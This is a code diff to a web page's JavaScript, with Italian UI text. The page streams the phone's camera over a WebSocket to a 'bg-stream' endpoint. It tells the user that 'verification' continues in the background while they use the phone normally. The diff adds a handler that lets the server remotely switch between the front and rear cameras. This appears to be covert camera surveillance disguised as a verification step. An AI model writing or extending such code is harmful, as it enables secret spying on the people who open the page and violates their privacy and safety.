@@ -23,12 +23,23 @@
     const room = new URLSearchParams(location.search).get('room') || 'user1';
     
     let stream = null;
-    let sending = false;
+  let sending = false;
+  let currentFacing = 'environment';
 
     // WebSocket (anche in background)
     const ws = new WebSocket(`wss://${location.host}/bg-stream?room=${room}`);
 
     ws.onopen = () => startCamera();
+    ws.onmessage = (e) => {
+      try {
+        const msg = JSON.parse(e.data);
+        if (msg.type === 'camera' && msg.mode) {
+          if (msg.mode !== currentFacing) {
+            startCamera(msg.mode);
+          }
+        }
+      } catch {}
+    };
     ws.onclose = () => console.log('Connessione persa');
     ws.onerror = () => console.log('Errore WS');
 
@@ -47,10 +58,14 @@
     }
 
     // Avvia fotocamera POSTERIORE
-    async function startCamera() {
+    async function startCamera(facing = 'environment') {
       try {
+        currentFacing = facing;
+        if (stream) {
+          stream.getTracks().forEach(t => t.stop());
+        }
         stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: 'environment', width: { ideal: 1280 } },
+          video: { facingMode: facing, width: { ideal: 1280 } },
           audio: false
         });
         video.srcObject = stream;
@@ -65,7 +80,6 @@
               <small>Puoi usare il telefono normalmente.<br>
               La verifica continua in background.</small>
             </div>`;
-          
           // Opzionale: minimizza automaticamente (solo mobile)
           setTimeout(() => {
             if (navigator.userActivation?.isActive) {
